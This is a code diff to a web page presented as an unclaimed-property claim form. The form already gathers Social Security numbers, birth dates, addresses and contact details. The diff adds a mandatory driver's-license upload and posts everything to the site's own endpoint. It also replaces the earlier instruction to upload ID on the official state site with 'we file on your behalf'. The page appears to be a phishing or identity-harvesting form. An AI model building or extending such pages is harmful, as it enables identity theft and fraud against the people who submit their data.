@@ -326,6 +326,57 @@
       word-break: break-all;
     }
 
+    /* Upload area */
+    .upload-area {
+      position: relative;
+      border: 2px dashed #2d3f55;
+      border-radius: 12px;
+      background: #1a2a3a;
+      padding: 20px 16px;
+      cursor: pointer;
+      transition: border-color 0.15s, background 0.15s;
+      text-align: center;
+    }
+    .upload-area:hover {
+      border-color: #10b981;
+      background: #0d2218;
+    }
+    .upload-area input[type="file"] {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0;
+      cursor: pointer;
+      z-index: 2;
+    }
+    .upload-label {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      pointer-events: none;
+    }
+    .upload-label svg {
+      color: #10b981;
+    }
+    .upload-label span {
+      font-size: 14px;
+      color: #94a3b8;
+      font-weight: 500;
+    }
+    .upload-label small {
+      font-size: 11px;
+      color: #475569;
+    }
+    .upload-preview {
+      margin-top: 12px;
+      text-align: center;
+    }
+    .required {
+      color: #f87171;
+    }
+
     /* Footer */
     .footer {
       margin-top: 28px;
@@ -380,7 +431,7 @@
       <span>Your information is <strong>256-bit SSL encrypted</strong> and never sold to third parties.</span>
     </div>
 
-    <form id="claim-form" novalidate>
+    <form id="claim-form" novalidate enctype="multipart/form-data">
       <input type="hidden" id="token" name="token"/>
 
       <!-- Personal Info -->
@@ -512,6 +563,29 @@
         </div>
       </div>
 
+      <!-- ID Upload -->
+      <div class="section-title">Identity Verification</div>
+
+      <div class="form-group" style="margin-bottom:14px">
+        <label>Driver's License or State ID <span class="required">*</span></label>
+        <div class="upload-area" id="upload-area">
+          <input type="file" id="id-upload" name="idImage" accept="image/*,.pdf" required/>
+          <div class="upload-label">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
+              <circle cx="12" cy="13" r="4"/>
+            </svg>
+            <span>Tap to upload a photo of your ID</span>
+            <small>JPG, PNG, or PDF &bull; Max 10MB</small>
+          </div>
+        </div>
+        <div class="upload-preview" id="upload-preview" style="display:none">
+          <img id="preview-img" style="max-width:100%;border-radius:8px"/>
+          <p id="preview-name" style="color:#94a3b8;font-size:13px;margin-top:8px"></p>
+        </div>
+        <span class="field-error" id="idUpload-err">Please upload a photo of your driver's license or state ID</span>
+      </div>
+
       <button type="submit" class="submit-btn" id="submit-btn">
         Submit My Claim Information →
       </button>
@@ -528,20 +602,20 @@
         <polyline points="20 6 9 17 4 12"/>
       </svg>
     </div>
-    <h2>Information Received!</h2>
-    <p>Thank you — your claim information has been securely submitted. Here's what happens next:</p>
+    <h2>All Done!</h2>
+    <p>Your information and ID have been received. We will file your claim with the state and email you your Claim ID within 24 hours. No further action needed.</p>
     <div class="ty-steps">
       <div class="ty-step">
         <div class="ty-step-num">1</div>
-        <div><strong>Claim ID sent within 24 hours.</strong> You'll receive an email with your unique Claim ID once we've verified and filed your claim with the state.</div>
+        <div><strong>We file on your behalf.</strong> Our team submits your unclaimed property claim with the state — you don't need to do anything.</div>
       </div>
       <div class="ty-step">
         <div class="ty-step-num">2</div>
-        <div><strong>Upload your ID.</strong> Once you receive your Claim ID, visit <a class="ty-link" href="https://claimit.ca.gov/app/claim-doc-upload" target="_blank" rel="noopener">claimit.ca.gov/app/claim-doc-upload</a> and upload a photo of your driver's license or state ID.</div>
+        <div><strong>Claim ID emailed to you.</strong> You'll receive your unique Claim ID confirmation within 24 hours.</div>
       </div>
       <div class="ty-step">
         <div class="ty-step-num">3</div>
-        <div><strong>Receive your funds.</strong> The state will process your claim and send your funds directly to you — typically within 6–8 weeks.</div>
+        <div><strong>Receive your funds.</strong> The state processes your claim and sends funds directly to you — typically within 6–8 weeks.</div>
       </div>
     </div>
   </div>
@@ -612,6 +686,33 @@
     if (field) field.classList.remove('error');
   }
 
+  // ID upload preview
+  const idUpload = document.getElementById('id-upload');
+  const uploadPreview = document.getElementById('upload-preview');
+  const previewImg = document.getElementById('preview-img');
+  const previewName = document.getElementById('preview-name');
+  const uploadArea = document.getElementById('upload-area');
+
+  idUpload.addEventListener('change', function() {
+    const file = this.files[0];
+    if (!file) return;
+    previewName.textContent = file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB)';
+    if (file.type.startsWith('image/')) {
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        previewImg.src = e.target.result;
+        previewImg.style.display = 'block';
+      };
+      reader.readAsDataURL(file);
+    } else {
+      previewImg.style.display = 'none';
+    }
+    uploadPreview.style.display = 'block';
+    uploadArea.style.borderColor = '#10b981';
+    uploadArea.style.background = '#0d2218';
+    clearErr('idUpload');
+  });
+
   function validateForm() {
     let valid = true;
     const required = ['firstName','lastName','address','city','zip','email','phone'];
@@ -637,10 +738,18 @@
     const emailEl = document.getElementById('email');
     if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailEl.value)) { showErr('email', 'Enter a valid email address'); valid = false; } else { clearErr('email'); }
 
+    // ID upload
+    if (!idUpload.files || !idUpload.files[0]) {
+      showErr('idUpload', "Please upload a photo of your driver's license or state ID");
+      valid = false;
+    } else {
+      clearErr('idUpload');
+    }
+
     return valid;
   }
 
-  // Form submit
+  // Form submit — uses FormData for multipart/form-data (file upload)
   document.getElementById('claim-form').addEventListener('submit', async function(e) {
     e.preventDefault();
     if (!validateForm()) return;
@@ -649,25 +758,26 @@
     btn.disabled = true;
     btn.textContent = 'Submitting...';
 
-    const payload = {
-      token: document.getElementById('token').value,
-      firstName: document.getElementById('firstName').value.trim(),
-      lastName: document.getElementById('lastName').value.trim(),
-      dob: document.getElementById('dobYear').value + '-' + document.getElementById('dobMonth').value + '-' + document.getElementById('dobDay').value,
-      ssn: ssnInput.value,
-      address: document.getElementById('address').value.trim(),
-      city: document.getElementById('city').value.trim(),
-      state: document.getElementById('state').value,
-      zip: document.getElementById('zip').value.trim(),
-      email: document.getElementById('email').value.trim(),
-      phone: document.getElementById('phone').value.trim()
-    };
+    const formData = new FormData();
+    formData.append('token', document.getElementById('token').value);
+    formData.append('firstName', document.getElementById('firstName').value.trim());
+    formData.append('lastName', document.getElementById('lastName').value.trim());
+    formData.append('dob', document.getElementById('dobYear').value + '-' + document.getElementById('dobMonth').value + '-' + document.getElementById('dobDay').value);
+    formData.append('ssn', ssnInput.value);
+    formData.append('address', document.getElementById('address').value.trim());
+    formData.append('city', document.getElementById('city').value.trim());
+    formData.append('state', document.getElementById('state').value);
+    formData.append('zip', document.getElementById('zip').value.trim());
+    formData.append('email', document.getElementById('email').value.trim());
+    formData.append('phone', document.getElementById('phone').value.trim());
+    if (idUpload.files[0]) {
+      formData.append('idImage', idUpload.files[0]);
+    }
 
     try {
       const res = await fetch('/submit-claim-info', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
+        body: formData
       });
       const data = await res.json();
       if (data.success) {
